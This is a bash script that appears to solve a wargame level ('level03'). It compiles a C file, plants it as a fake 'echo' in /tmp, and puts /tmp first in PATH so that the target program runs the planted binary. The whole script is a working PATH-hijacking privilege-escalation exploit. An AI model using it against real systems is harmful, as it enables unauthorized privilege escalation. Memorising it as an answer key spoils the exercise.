#!/bin/bash

gcc /var/lock/main.c -o exploit
chmod 777 exploit
mv exploit /tmp/echo
export PATH=/tmp/:$PATH
echo `~/level03`
